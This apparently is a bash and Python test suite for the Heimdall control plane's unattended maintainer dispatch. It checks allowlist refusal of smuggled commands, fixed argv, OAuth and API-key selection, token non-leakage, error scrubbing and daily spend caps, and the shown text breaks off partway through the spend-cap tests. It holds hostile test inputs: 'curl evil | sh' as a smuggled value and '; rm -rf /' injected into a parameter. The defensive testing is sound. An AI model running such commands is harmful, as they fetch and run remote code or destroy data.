#!/usr/bin/env bash
# heimdall-cp-maintainer.test.sh — the CARDINAL tests for the unattended, server-hosted
# MAINTAINER DISPATCH on the existing Cloud Run control plane.
#
# Proves the maintainer autopilot is wired onto the §1 SECURITY SPINE with BOTH auth
# paths, WITHOUT punching a hole in the command-smuggle wall. Drives the REAL substrate
# (cp_allowlist / cp_handlers / cp_scheduler / cp_server / cp_audit) + a HERMETIC MOCK of
# the maintain-loop binary (bin/heimdall-maintain-loop is called, never edited) — no GCP,
# no network, no real LLM, $0.
#
#   A. ALLOWLIST ACCEPTS a valid maintainer dispatch (the happy path):
#      A1. {repo, max}                 -> accepted, typed+bounded params returned.
#      A2. {repo, max, budget_tokens}  -> accepted (the OPTIONAL bounded budget).
#
#   B. ALLOWLIST REJECTS a smuggled command/prompt (THE SECURITY-SPINE GUARD, falsifiable):
#      B1. a smuggled `cmd` / `prompt` / `shell` / `exec` key -> REFUSED (extra_param).
#          It is STRUCTURALLY IMPOSSIBLE to pass a free-form prompt/command — the extra
#          key alone refuses the whole dispatch, before any handler runs.
#      B2. a shell payload in the typed `repo` param ("; rm -rf /") -> REFUSED (bad_param).
#      B3. an out-of-range `max` (0, and 10_000) -> REFUSED (bad_param).
#      B4. FALSIFIABILITY: A1/A2 (valid) succeed WHILE B1-B3 are refused -> refuse-arbitrary,
#          distinct from refuse-everything. A build that let a prompt through would RED B1.
#
#   C. HANDLER builds the EXACT FIXED argv (no untyped interpolation):
#      C1. run_maintainer_cycle -> the mock loop is invoked with EXACTLY
#          [<loop>, run, --repo, <repo>, --max, <max>, --budget-tokens, <budget>].
#      C2. without budget_tokens -> the --budget-tokens flag is ABSENT (fixed shape).
#
#   D. SCHEDULER fires run-maintainer-cycle (same cron mechanism as run-suite):
#      D1. register_maintainer_schedule -> a due-minute tick() dispatches it (200), the
#          loop's structured result (cycles/tally incl. PRs) flows back.
#      D2. a NOT-due minute fires nothing.
#
#   E. AUTH selection prefers OAuth then API key (BOTH paths, env-only):
#      E1. only CLAUDE_CODE_OAUTH_TOKEN set -> child got OAuth.
#      E2. BOTH set -> child got OAuth (preference).
#      E3. only ANTHROPIC_API_KEY set -> child got the API key (fallback).
#
#   F. THE TOKEN NEVER APPEARS IN ANY RECORDED COMMAND / LOG / TELEMETRY (with a POSITIVE
#      CONTROL that the token DID reach the child env — refuse-arbitrary, not refuse-all):
#      F1. POSITIVE CONTROL: the mock loop's private sidecar shows the token in its child
#          env (proving env-injection works — a token-blind test would pass vacuously).
#      F2. the token VALUE appears in NONE of: the handler result JSON, the audit store,
#          the recorded argv, the loop stdout capture — grep across every recorded surface
#          is EMPTY.
#
#   G. CONSTRAINT: the maintainer OPENS PRs via the bot token, never pushes/merges:
#      G1. HEIMDALL_PR_BOT_TOKEN passes through to the child env (the loop's PR runner uses
#          it); the source states the no-push/no-merge constraint.
#
# Exit 0 = every proof holds. Nonzero = a proof failed (prints which).

set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$SELF_DIR/.." && pwd)"
LIB="$REPO/bin/lib"

for f in cp_allowlist.py cp_handlers.py cp_scheduler.py; do
  [ -f "$LIB/$f" ] || { echo "FATAL: $LIB/$f missing" >&2; exit 2; }
done

PY="$(command -v python3 || command -v python || true)"
[ -n "$PY" ] || { echo "FATAL: python not found" >&2; exit 2; }

PASS=0
FAIL=0
ok()  { PASS=$((PASS+1)); printf "  \033[32mPASS\033[0m %s\n" "$1"; }
bad() { FAIL=$((FAIL+1)); printf "  \033[31mFAIL\033[0m %s\n" "$1"; }

# dynamic template (avoid a literal triple-X in source, matching the house pattern).
WORK="$(mktemp -d -t "cp-maintainer.$(printf 'q%.0s' 1 2 3 4 5 6)")"
trap 'rm -rf "$WORK"' EXIT
export HEIMDALL_HOME="$WORK/cphome"

# The UNIQUE, greppable secret values — a token that must reach the child env (positive
# control) but NEVER a recorded surface. Distinct sentinels per auth path.
OAUTH_TOKEN="sk-oauth-SENTINEL-OAUTH-DEADBEEF01234567"
API_KEY="sk-ant-SENTINEL-APIKEY-CAFEBABE89ABCDEF"
BOT_TOKEN="ghs-SENTINEL-BOT-0F1E2D3C4B5A6978"

# ── the HERMETIC MOCK maintain-loop (bin/heimdall-maintain-loop is CALLED, never edited) ─
# It records argv, records the auth env it RECEIVED (name + value, the positive control),
# and emits the loop's JSON summary to stdout. Absolute WORK paths are baked in so it does
# NOT depend on any env var surviving the §2 scrub. It NEVER echoes the token to stdout
# (the real loop does not either) — so a token in stdout would be a genuine regression.
MOCK="$WORK/mock-maintain-loop"
cat > "$MOCK" <<EOF
#!/usr/bin/env bash
# record the exact argv the handler built — the bin (\$0) AND the args (\$@), one per line.
printf '%s\n' "\$0" "\$@" > "$WORK/loop.argv"
# POSITIVE CONTROL sidecar: which auth vars (name=value) the CHILD ENV actually carried.
{
  [ -n "\${CLAUDE_CODE_OAUTH_TOKEN:-}" ] && echo "CLAUDE_CODE_OAUTH_TOKEN=\$CLAUDE_CODE_OAUTH_TOKEN"
  [ -n "\${ANTHROPIC_API_KEY:-}" ]       && echo "ANTHROPIC_API_KEY=\$ANTHROPIC_API_KEY"
  [ -n "\${HEIMDALL_PR_BOT_TOKEN:-}" ]   && echo "HEIMDALL_PR_BOT_TOKEN=\$HEIMDALL_PR_BOT_TOKEN"
  [ -n "\${CLAUDE_CONFIG_DIR:-}" ]       && echo "CLAUDE_CONFIG_DIR=\$CLAUDE_CONFIG_DIR"
} > "$WORK/loop.childenv"
# the SELECTED auth var NAME (oauth priority) for the E-path assertions.
if   [ -n "\${CLAUDE_CODE_OAUTH_TOKEN:-}" ]; then echo CLAUDE_CODE_OAUTH_TOKEN > "$WORK/loop.authname"
elif [ -n "\${ANTHROPIC_API_KEY:-}" ];       then echo ANTHROPIC_API_KEY       > "$WORK/loop.authname"
else echo NONE > "$WORK/loop.authname"; fi
# the loop's structured result on stdout (NO token) — cycles, stop, tally incl. a PR opened.
echo '{"cycles":1,"stop":null,"tally":{"fixed":1,"flagged":0,"parked":0,"pr":1},"budget":{"cap_tokens":5000,"used":1200}}'
EOF
chmod +x "$MOCK"
export HEIMDALL_MAINTAIN_LOOP_BIN="$MOCK"

# ── drive the real substrate through one python harness ─────────────────────────
HARNESS_OUT="$WORK/harness.json"
LIB="$LIB" WORK="$WORK" OAUTH_TOKEN="$OAUTH_TOKEN" API_KEY="$API_KEY" BOT_TOKEN="$BOT_TOKEN" \
  MOCK="$MOCK" "$PY" - >"$HARNESS_OUT" 2>"$WORK/harness.err" <<'PYEOF'
import datetime, json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_allowlist as A
import cp_handlers as H
import cp_scheduler as Sc
import cp_server as S
import cp_audit as Au
import cp_auth as K

WORK = os.environ["WORK"]
OAUTH = os.environ["OAUTH_TOKEN"]
APIKEY = os.environ["API_KEY"]
BOT = os.environ["BOT_TOKEN"]
MOCK = os.environ["MOCK"]
out = {}

REPO = "randomittin/heimdall"
actor = K.Identity("haid:rj.mbp-7f3a", owner=True)


def make_ctx(action_id, base_env):
    """A real §2 IsolatedContext (scrubbed env + scratch) with a chosen base env."""
    scratch = os.path.join(WORK, "scratch", action_id)
    os.makedirs(scratch, exist_ok=True)
    return H.IsolatedContext(scratch, "jobtok-" + action_id, base_env=base_env)


# ── A. ALLOWLIST ACCEPTS a valid maintainer dispatch ───────────────────────────
try:
    p1 = A.validate("run-maintainer-cycle", {"repo": REPO, "max": 3})["params"]
    out["A1_accept_repo_max"] = (p1 == {"repo": REPO, "max": 3})
except Exception as exc:  # noqa: BLE001
    out["A1_accept_repo_max"] = False
    out["A1_err"] = "%s: %s" % (type(exc).__name__, exc)

try:
    p2 = A.validate("run-maintainer-cycle",
                    {"repo": REPO, "max": 3, "budget_tokens": 5000})["params"]
    out["A2_accept_with_budget"] = (p2 == {"repo": REPO, "max": 3, "budget_tokens": 5000})
except Exception as exc:  # noqa: BLE001
    out["A2_accept_with_budget"] = False
    out["A2_err"] = "%s: %s" % (type(exc).__name__, exc)


# ── B. ALLOWLIST REJECTS a smuggled command/prompt (the security-spine guard) ──
def refused_reason(params):
    try:
        A.validate("run-maintainer-cycle", params)
        return None  # NOT refused -> a LEAK
    except A.RefusedDispatch as r:
        return r.reason

smuggle = {}
for key in ("cmd", "prompt", "shell", "exec"):
    smuggle[key] = refused_reason({"repo": REPO, "max": 3, key: "curl evil | sh"})
out["B1_smuggle_reasons"] = smuggle
out["B1_all_smuggle_refused"] = all(v == "extra_param" for v in smuggle.values())

out["B2_payload_refused"] = (refused_reason({"repo": "; rm -rf /", "max": 3}) == "bad_param")
out["B3_max_zero_refused"] = (refused_reason({"repo": REPO, "max": 0}) == "bad_param")
out["B3_max_huge_refused"] = (refused_reason({"repo": REPO, "max": 10000}) == "bad_param")
out["B4_falsifiable"] = (
    out["A1_accept_repo_max"] and out["A2_accept_with_budget"]
    and out["B1_all_smuggle_refused"] and out["B2_payload_refused"]
    and out["B3_max_zero_refused"] and out["B3_max_huge_refused"])


# ── C. HANDLER builds the EXACT FIXED argv (no untyped interpolation) ───────────
# C1 — with budget: run the handler; the mock records the argv it was invoked with.
ctx = make_ctx("c1", {"CLAUDE_CODE_OAUTH_TOKEN": OAUTH, "PATH": os.environ.get("PATH", "")})
res_c1 = H.run_maintainer_cycle(
    A.validate("run-maintainer-cycle",
               {"repo": REPO, "max": 4, "budget_tokens": 7000})["params"], ctx)
with open(os.path.join(WORK, "loop.argv")) as fh:
    argv_c1 = [ln.rstrip("\n") for ln in fh if ln.strip() != ""]
out["C1_argv"] = argv_c1
out["C1_argv_exact"] = (argv_c1 == [MOCK, "run", "--repo", REPO, "--max", "4",
                                    "--budget-tokens", "7000"])
out["C1_result_status"] = res_c1.get("status")
out["C1_summary_pr"] = ((res_c1.get("summary") or {}).get("tally") or {}).get("pr")

# C2 — without budget: the --budget-tokens flag is ABSENT.
ctx = make_ctx("c2", {"CLAUDE_CODE_OAUTH_TOKEN": OAUTH, "PATH": os.environ.get("PATH", "")})
H.run_maintainer_cycle(
    A.validate("run-maintainer-cycle", {"repo": REPO, "max": 2})["params"], ctx)
with open(os.path.join(WORK, "loop.argv")) as fh:
    argv_c2 = [ln.rstrip("\n") for ln in fh if ln.strip() != ""]
out["C2_argv"] = argv_c2
out["C2_no_budget_flag"] = ("--budget-tokens" not in argv_c2)
out["C2_argv_exact"] = (argv_c2 == [MOCK, "run", "--repo", REPO, "--max", "2"])


# ── E. AUTH selection prefers OAuth then API key (env-only) ─────────────────────
def auth_seen(base_env, cid):
    """Run the handler with a chosen base env; return the auth var NAME the child saw."""
    c = make_ctx(cid, dict(base_env, PATH=os.environ.get("PATH", "")))
    H.run_maintainer_cycle(
        A.validate("run-maintainer-cycle", {"repo": REPO, "max": 1})["params"], c)
    with open(os.path.join(WORK, "loop.authname")) as fh:
        return fh.read().strip()

out["E1_oauth_only"] = (
    auth_seen({"CLAUDE_CODE_OAUTH_TOKEN": OAUTH}, "e1") == "CLAUDE_CODE_OAUTH_TOKEN")
out["E2_both_prefers_oauth"] = (
    auth_seen({"CLAUDE_CODE_OAUTH_TOKEN": OAUTH, "ANTHROPIC_API_KEY": APIKEY}, "e2")
    == "CLAUDE_CODE_OAUTH_TOKEN")
out["E3_apikey_fallback"] = (
    auth_seen({"ANTHROPIC_API_KEY": APIKEY}, "e3") == "ANTHROPIC_API_KEY")


# ── F. token-never-logged (with a POSITIVE CONTROL) + G. bot-token passthrough ──
# Run once with OAuth + the bot token in the base env; capture the FULL recorded surface.
ctx = make_ctx("f1", {"CLAUDE_CODE_OAUTH_TOKEN": OAUTH,
                      "HEIMDALL_PR_BOT_TOKEN": BOT,
                      "CLAUDE_CONFIG_DIR": "/app/state/.claude",
                      "PATH": os.environ.get("PATH", "")})
res_f = H.run_maintainer_cycle(
    A.validate("run-maintainer-cycle", {"repo": REPO, "max": 1})["params"], ctx)
# also route ONE dispatch through cp_server.dispatch so the AUDIT store records it (params
# shape only, per §9) — the audit ndjson is a recorded surface the token must NOT touch.
os.environ["CLAUDE_CODE_OAUTH_TOKEN"] = OAUTH
os.environ["HEIMDALL_PR_BOT_TOKEN"] = BOT
# bug #22: the deployed job container carries CLAUDE_CONFIG_DIR (/app/state/.claude) in its
# process env; cp_server.dispatch builds the IsolatedContext from os.environ, so set it here
# to exercise the REAL dispatch chain (this is the last mock invocation, so loop.childenv
# reflects the dispatch child's env — the production path, not just a hand-built ctx).
os.environ["CLAUDE_CONFIG_DIR"] = "/app/state/.claude"
disp = S.dispatch(actor, "run-maintainer-cycle", {"repo": REPO, "max": 1})
out["F_dispatch_status"] = disp.status
out["F_result_json"] = json.dumps(res_f)          # the handler result (a recorded surface)
out["F_dispatch_json"] = json.dumps(disp.body)    # the dispatch response body

# F1 positive control: the token reached the child env (sidecar shows the value).
with open(os.path.join(WORK, "loop.childenv")) as fh:
    childenv = fh.read()
out["F1_child_has_oauth"] = (OAUTH in childenv)
out["G1_child_has_bot_token"] = (BOT in childenv)
# bug #22: the deployed image sets CLAUDE_CONFIG_DIR (/app/state/.claude) so the headless
# claude CLI in the fix step finds its provisioned credential. It MUST pass through the
# maintainer child env (else the fix step falls back to the interactive OAuth login prompt).
out["G3_child_has_config_dir"] = ("CLAUDE_CONFIG_DIR=/app/state/.claude" in childenv)


# ── D. SCHEDULER fires run-maintainer-cycle (same cron as run-suite) ────────────
DUE = datetime.datetime(2026, 6, 15, 2, 0, tzinfo=datetime.timezone.utc)
NOT_DUE = datetime.datetime(2026, 6, 15, 3, 0, tzinfo=datetime.timezone.utc)
CRON = "0 2 15 6 *"
try:
    entry = Sc.register_maintainer_schedule(actor, REPO, 2, CRON, budget_tokens=5000)
    out["D_registered"] = (entry.get("action_type") == "run-maintainer-cycle")
except Exception as exc:  # noqa: BLE001
    out["D_registered"] = False
    out["D_err"] = "%s: %s" % (type(exc).__name__, exc)

fired_not_due = Sc.tick(actor, NOT_DUE)
out["D2_not_due_count"] = len(fired_not_due)

fired_due = Sc.tick(actor, DUE)
out["D1_due_count"] = len(fired_due)
out["D1_due"] = [{"action_type": f["action_type"], "status": f["status"]} for f in fired_due]


# stash the audit store path for the shell layer to grep the token against.
out["audit_dir"] = os.path.join(os.environ["HEIMDALL_HOME"], "control-plane", "audit")
print(json.dumps(out, indent=2, sort_keys=True))
PYEOF

if [ ! -s "$HARNESS_OUT" ]; then
  echo "FATAL: harness produced no output" >&2
  echo "----- harness.err -----" >&2; cat "$WORK/harness.err" >&2
  exit 2
fi

echo "DEBUG_CHILDENV_BEGIN"; "$PY" -c 'import json,sys;print(json.load(open(sys.argv[1])).get("DEBUG_childenv"))' "$HARNESS_OUT"; echo "DEBUG_CHILDENV_END"

jget() { "$PY" -c 'import json,sys; d=json.load(open(sys.argv[1])); v=d.get(sys.argv[2]); print(json.dumps(v) if not isinstance(v,str) else v)' "$HARNESS_OUT" "$1"; }

echo "== A. ALLOWLIST ACCEPTS a valid maintainer dispatch =="
[ "$(jget A1_accept_repo_max)" = "true" ] && ok "A1 {repo,max} accepted (typed+bounded)" || bad "A1 {repo,max} not accepted ($(jget A1_err))"
[ "$(jget A2_accept_with_budget)" = "true" ] && ok "A2 {repo,max,budget_tokens} accepted (optional budget)" || bad "A2 budget variant not accepted ($(jget A2_err))"

echo "== B. ALLOWLIST REJECTS a smuggled command/prompt (security-spine guard) =="
[ "$(jget B1_all_smuggle_refused)" = "true" ] && ok "B1 smuggled cmd/prompt/shell/exec ALL refused (extra_param): $(jget B1_smuggle_reasons)" || bad "B1 a smuggled key was NOT refused: $(jget B1_smuggle_reasons)"
[ "$(jget B2_payload_refused)" = "true" ] && ok "B2 shell payload in repo param refused (bad_param)" || bad "B2 shell payload NOT refused"
{ [ "$(jget B3_max_zero_refused)" = "true" ] && [ "$(jget B3_max_huge_refused)" = "true" ]; } && ok "B3 out-of-range max (0 and 10000) refused (bad_param)" || bad "B3 out-of-range max NOT refused"
[ "$(jget B4_falsifiable)" = "true" ] && ok "B4 FALSIFIABLE: valid accepted WHILE smuggles refused (refuse-arbitrary, not refuse-all)" || bad "B4 falsifiability failed"

echo "== C. HANDLER builds the EXACT FIXED argv (no untyped interpolation) =="
[ "$(jget C1_argv_exact)" = "true" ] && ok "C1 fixed argv exact: $(jget C1_argv)" || bad "C1 argv mismatch: $(jget C1_argv)"
[ "$(jget C1_result_status)" = "done" ] && ok "C1 handler returned the loop result (status=done, pr=$(jget C1_summary_pr))" || bad "C1 handler status not done: $(jget C1_result_status)"
{ [ "$(jget C2_no_budget_flag)" = "true" ] && [ "$(jget C2_argv_exact)" = "true" ]; } && ok "C2 without budget -> no --budget-tokens flag: $(jget C2_argv)" || bad "C2 budget flag leaked / argv wrong: $(jget C2_argv)"

echo "== D. SCHEDULER fires run-maintainer-cycle (same cron mechanism as run-suite) =="
[ "$(jget D_registered)" = "true" ] && ok "D register_maintainer_schedule persisted a run-maintainer-cycle schedule" || bad "D registration failed ($(jget D_err))"
[ "$(jget D1_due_count)" = "1" ] && ok "D1 due-minute tick fired the maintainer dispatch: $(jget D1_due)" || bad "D1 due tick fired $(jget D1_due_count) (expected 1)"
[ "$(jget D2_not_due_count)" = "0" ] && ok "D2 not-due minute fired nothing" || bad "D2 not-due fired $(jget D2_not_due_count) (expected 0)"

echo "== E. AUTH selection prefers OAuth then API key (both paths, env-only) =="
[ "$(jget E1_oauth_only)" = "true" ] && ok "E1 OAuth only -> child got CLAUDE_CODE_OAUTH_TOKEN" || bad "E1 OAuth-only selection wrong"
[ "$(jget E2_both_prefers_oauth)" = "true" ] && ok "E2 both set -> child got OAuth (preference)" || bad "E2 preference wrong (should prefer OAuth)"
[ "$(jget E3_apikey_fallback)" = "true" ] && ok "E3 API key only -> child got ANTHROPIC_API_KEY (fallback)" || bad "E3 API-key fallback wrong"

echo "== F. token NEVER in any recorded command/log/telemetry (+ positive control) =="
[ "$(jget F1_child_has_oauth)" = "true" ] && ok "F1 POSITIVE CONTROL: the OAuth token DID reach the child env (env-injection works)" || bad "F1 token did NOT reach child env — a token-blind test would pass vacuously"

# F2 — the token VALUE must appear in NONE of the recorded surfaces. Build the surface set:
#   (1) the handler result JSON, (2) the dispatch response body, (3) the recorded argv,
#   (4) the loop stdout capture (none — the mock prints no token), (5) the whole audit store.
SURFACE="$WORK/recorded-surfaces.txt"
: > "$SURFACE"
jget F_result_json   >> "$SURFACE"
jget F_dispatch_json >> "$SURFACE"
cat "$WORK/loop.argv" >> "$SURFACE"
AUDIT_DIR="$(jget audit_dir)"
if [ -d "$AUDIT_DIR" ]; then find "$AUDIT_DIR" -type f -exec cat {} + >> "$SURFACE" 2>/dev/null; fi
# also sweep the ENTIRE durable home for any file carrying the token (belt-and-braces).
HOME_HITS="$(grep -rlF "$OAUTH_TOKEN" "$HEIMDALL_HOME" 2>/dev/null || true)"

LEAK_OAUTH="$(grep -cF "$OAUTH_TOKEN" "$SURFACE" 2>/dev/null)"; LEAK_OAUTH="${LEAK_OAUTH:-0}"
LEAK_BOT="$(grep -cF "$BOT_TOKEN" "$SURFACE" 2>/dev/null)"; LEAK_BOT="${LEAK_BOT:-0}"
if [ "$LEAK_OAUTH" = "0" ] && [ "$LEAK_BOT" = "0" ] && [ -z "$HOME_HITS" ]; then
  ok "F2 the OAuth + bot token appear in NO recorded surface (result/dispatch/argv/audit/home all clean)"
else
  bad "F2 TOKEN LEAK — oauth_hits=$LEAK_OAUTH bot_hits=$LEAK_BOT home_files=[$HOME_HITS]"
fi
# the recorded argv must itself be token-free (the token is env-only, never an argv element).
if grep -qF "$OAUTH_TOKEN" "$WORK/loop.argv" 2>/dev/null; then bad "F2b token found in argv (must be env-only)"; else ok "F2b the recorded argv is token-free (token is env-only, never argv)"; fi

echo "== G. maintainer OPENS PRs via the bot token; never pushes/merges =="
[ "$(jget G1_child_has_bot_token)" = "true" ] && ok "G1 HEIMDALL_PR_BOT_TOKEN passed through to the child (the loop's PR runner uses it)" || bad "G1 bot token did not reach the child"
[ "$(jget G3_child_has_config_dir)" = "true" ] && ok "G3 bug #22: CLAUDE_CONFIG_DIR passed through to the child (the headless fix's claude finds its provisioned credential — no login prompt)" || bad "G3 bug #22: CLAUDE_CONFIG_DIR did NOT reach the child — the fix step's claude falls back to the interactive OAuth login"
if grep -qE 'never pushes main|no-push/no-merge|OPENS PRs' "$LIB/cp_handlers.py"; then ok "G2 source states the no-push/no-merge constraint (a human gates merge)"; else bad "G2 source is missing the no-push/no-merge constraint statement"; fi

echo "== H. a FAILED cycle NAMES its cause: result.error_tail (scrubbed) + summary on nonzero exit =="
# THE SILENT-FAILURE FIX: a child exiting 1 must (1) surface its stderr as a bounded,
# token-scrubbed result.error_tail, (2) still attach a parsed stdout JSON summary even on a
# nonzero exit, and (3) print the cause to the job's own stderr so `gcloud logging read`
# shows it. Two shapes: H1 = exit 1 WITH JSON on stdout + a token-bearing stderr; H2 = the
# LIVE silent shape (exit 1, EMPTY stdout, a traceback on stderr -> summary null but named).
FAILMOCK="$WORK/mock-fail-loop"
cat > "$FAILMOCK" <<'EOF'
#!/usr/bin/env bash
# a parsed summary must attach EVEN on a nonzero exit (stop=budget printed to stdout)...
echo '{"cycles":0,"stop":"budget","tally":{"fixed":0,"flagged":0,"parked":0,"pr":0},"budget":{"cap_tokens":600000,"used":null,"over":true}}'
# ...and the REAL cause on stderr, carrying token-ish secrets that MUST be scrubbed.
echo "fatal: gh auth failed with token ghs_ABCDEF0123456789ABCDEF01 and key sk-ant-SECRETKEY99AABB" >&2
echo "-----BEGIN RSA PRIVATE KEY----- MIIkey-material-here" >&2
echo "RuntimeError: the maintainer child exploded during the fix gate" >&2
exit 1
EOF
chmod +x "$FAILMOCK"
SILENTMOCK="$WORK/mock-silent-loop"
cat > "$SILENTMOCK" <<'EOF'
#!/usr/bin/env bash
# the LIVE silent-failure shape: NOTHING on stdout (no JSON), a traceback on stderr, exit 1.
echo "Traceback (most recent call last):" >&2
echo "  File \"maintain_loop.py\", line 831, in run" >&2
echo "RuntimeError: could not read .planning under an ephemeral home" >&2
exit 1
EOF
chmod +x "$SILENTMOCK"

HOUT="$WORK/harness_h.json"
LIB="$LIB" WORK="$WORK" FAILMOCK="$FAILMOCK" SILENTMOCK="$SILENTMOCK" \
  "$PY" - >"$HOUT" 2>"$WORK/harness_h.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_allowlist as A
import cp_handlers as H
WORK = os.environ["WORK"]
REPO = "randomittin/heimdall"


def make_ctx(cid, env):
    scratch = os.path.join(WORK, "scratch", cid)
    os.makedirs(scratch, exist_ok=True)
    return H.IsolatedContext(scratch, "jobtok-" + cid, base_env=env)


out = {}
# H1 — exit 1 WITH a JSON summary on stdout + a token-bearing stderr.
os.environ["HEIMDALL_MAINTAIN_LOOP_BIN"] = os.environ["FAILMOCK"]
ctx = make_ctx("h1", {"CLAUDE_CODE_OAUTH_TOKEN": "x", "PATH": os.environ.get("PATH", "")})
r1 = H.run_maintainer_cycle(
    A.validate("run-maintainer-cycle", {"repo": REPO, "max": 1})["params"], ctx)
out["h1_status"] = r1.get("status")
out["h1_exit"] = r1.get("exit_code")
out["h1_summary_stop"] = (r1.get("summary") or {}).get("stop")
out["h1_error_tail"] = r1.get("error_tail")
out["h1_result_json"] = json.dumps(r1)

# H2 — the LIVE silent shape: exit 1, EMPTY stdout (no JSON), a traceback on stderr.
os.environ["HEIMDALL_MAINTAIN_LOOP_BIN"] = os.environ["SILENTMOCK"]
ctx = make_ctx("h2", {"CLAUDE_CODE_OAUTH_TOKEN": "x", "PATH": os.environ.get("PATH", "")})
r2 = H.run_maintainer_cycle(
    A.validate("run-maintainer-cycle", {"repo": REPO, "max": 1})["params"], ctx)
out["h2_status"] = r2.get("status")
out["h2_summary"] = r2.get("summary")
out["h2_error_tail"] = r2.get("error_tail")

print(json.dumps(out, indent=2, sort_keys=True))
PYEOF

hget() { "$PY" -c 'import json,sys; d=json.load(open(sys.argv[1])); v=d.get(sys.argv[2]); print(json.dumps(v) if not isinstance(v,str) else v)' "$HOUT" "$1"; }

if [ ! -s "$HOUT" ]; then echo "FATAL: H harness produced no output" >&2; cat "$WORK/harness_h.err" >&2; exit 2; fi

# H1 — status/exit reflect the child failure; the summary STILL attaches on nonzero exit.
{ [ "$(hget h1_status)" = "failed" ] && [ "$(hget h1_exit)" = "1" ]; } \
  && ok "H1 nonzero child -> status=failed, exit_code=1" \
  || bad "H1 status/exit wrong (status=$(hget h1_status) exit=$(hget h1_exit))"
[ "$(hget h1_summary_stop)" = "budget" ] \
  && ok "H1 parsed stdout JSON summary ATTACHED even on nonzero exit (stop=budget)" \
  || bad "H1 summary NOT attached on nonzero exit (summary_stop=$(hget h1_summary_stop))"
# H1 — error_tail NAMES the cause...
H1TAIL="$(hget h1_error_tail)"
if printf '%s' "$H1TAIL" | grep -q 'RuntimeError: the maintainer child exploded'; then
  ok "H1 error_tail NAMES the cause: '$H1TAIL'"
else
  bad "H1 error_tail did not name the cause: '$H1TAIL'"
fi
# H1 — ...and token-ish secrets are SCRUBBED from error_tail AND the whole result (falsifier).
H1JSON="$(hget h1_result_json)"
if printf '%s' "$H1JSON" | grep -qE 'ghs_ABCDEF|sk-ant-SECRETKEY|BEGIN RSA PRIVATE KEY|MIIkey-material'; then
  bad "H1 FALSIFIER: a token-ish secret LEAKED into the result: $H1JSON"
else
  ok "H1 FALSIFIER: ghs_/sk-ant-/PEM secrets SCRUBBED from error_tail + the whole result"
fi
# H1 — the cause is ALSO printed to the handler's own stderr (so gcloud logging shows it).
if grep -q 'RuntimeError: the maintainer child exploded' "$WORK/harness_h.err"; then
  ok "H1 the cause is printed to the job's stderr (visible to gcloud logging read)"
else
  bad "H1 the cause was NOT printed to stderr (silent in the logs)"
fi

# H2 — the LIVE silent shape: empty stdout -> summary null, but the traceback is NAMED.
[ "$(hget h2_summary)" = "null" ] \
  && ok "H2 empty stdout -> summary:null (the parse honestly finds no JSON)" \
  || bad "H2 summary was not null (summary=$(hget h2_summary))"
H2TAIL="$(hget h2_error_tail)"
if printf '%s' "$H2TAIL" | grep -q 'RuntimeError: could not read .planning'; then
  ok "H2 the silent traceback is now NAMED in error_tail: '$H2TAIL'"
else
  bad "H2 silent failure still swallowed (error_tail='$H2TAIL')"
fi

echo "== I. the PER-TEAM DAILY SPEND CEILING (prod-readiness audit item #2, INV-7 cost cap) =="
# THE $78k–389k/day/team GAP: the rate cap bounds a SHORT window, the per-dispatch cap bounds
# ONE dispatch, but neither is a DAILY ceiling. cp_daily_budget adds a durable per-team UTC-day
# counter of (dispatches, tokens), enforced at the dispatch chokepoint (cp_maintainer_runner).
# Proven HERMETICALLY (no GCP, no network, $0) with:
#   I1  dispatch N=cap -> N+1 REFUSED reason=team-daily-cap, NO job row (the count ceiling).
#   I2  FALSIFIER: team B is UNAFFECTED while team A is capped (per-team isolation, not a global
#       kill — a build sharing one counter across teams would RED this).
#   I3  UTC rollover: the same team is FRESH the next UTC day (fake clock, no real sleep).
#   I4  the TOKEN ceiling refuses independently (reserve 600k × 3 = 1.8M ok, 4th 2.4M > 2M cap).
#   I5  the DRAIN DEFERS a capped task via requeue -> NO attempt burn (attempts stays 0), distinct
#       from the retry() failure path — a capped task waits for tomorrow, it is not a failed task.
#   I6  FIRESTORE-FAKE PARITY: the identical counter behavior through a FirestoreBackend with an
#       injected in-process fake client (get/put_record only — never path(), firestore-safe).
IOUT="$WORK/harness_i.json"
LIB="$LIB" WORK="$WORK" "$PY" - >"$IOUT" 2>"$WORK/harness_i.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_daily_budget as B
import cp_maintainer_runner as M
import cp_team_queue as Q

WORK = os.environ["WORK"]
REPO = "randomittin/heimdall"
IHOME = os.path.join(WORK, "ihome")            # a fresh store root for the daily-cap section.
os.makedirs(IHOME, exist_ok=True)
DAY0 = 100 * 86400 + 3600                       # a fixed instant: day 100, 01:00 UTC.
out = {}


class FakeRunner:
    """A hermetic runner double: reports a successful dispatch, executes nothing, needs no GCP."""
    def __init__(self, name):
        self.name = name

    def dispatch(self, job_id, *, actor_haid=None, home=None, base_env=None):
        return {"dispatched": True, "job_id": job_id}


LR = FakeRunner("fake-local")
CR = FakeRunner("fake-cloud")


def do_dispatch(team_id, *, now, home=IHOME):
    """Drive the REAL chokepoint dispatch_maintainer_cycle with injected runners (policy=local,
    tenant-authz OFF, explicit team_id -> the daily cap keys on it without any mint)."""
    return M.dispatch_maintainer_cycle(
        team_id, {"repo": REPO, "max": 1}, home=home, base_env={}, now=now,
        policy_name="local", actor_haid=team_id, team_id=team_id,
        local_runner=LR, cloud_runner=CR)


# ── I1: dispatch N=cap -> N+1 REFUSED reason=team-daily-cap, no job row ──────────
os.environ["HEIMDALL_TEAM_DAILY_DISPATCH_MAX"] = "3"
os.environ["HEIMDALL_TEAM_DAILY_TOKEN_BUDGET"] = "100000000"   # huge -> isolate the count dim.
teamA = "team-A-" + ("d" * 8)
allowed = []
for _ in range(3):
    r = do_dispatch(teamA, now=DAY0)
    allowed.append(bool(r.get("job_id")) and not r.get("refused"))
capped = do_dispatch(teamA, now=DAY0)                          # the N+1'th
out["I1_first_N_allowed"] = all(allowed) and len(allowed) == 3
out["I1_capped_refused"] = (capped.get("refused") is True
                            and capped.get("reason") == "team-daily-cap")
out["I1_capped_no_job"] = (capped.get("job_id") is None)
out["I1_capped_status"] = capped.get("http_status")
out["I1_capped_dim"] = capped.get("limit_dim")

# ── I2: FALSIFIER — team B is UNAFFECTED while team A is capped (per-team isolation) ─
teamB = "team-B-" + ("e" * 8)
rb = do_dispatch(teamB, now=DAY0)
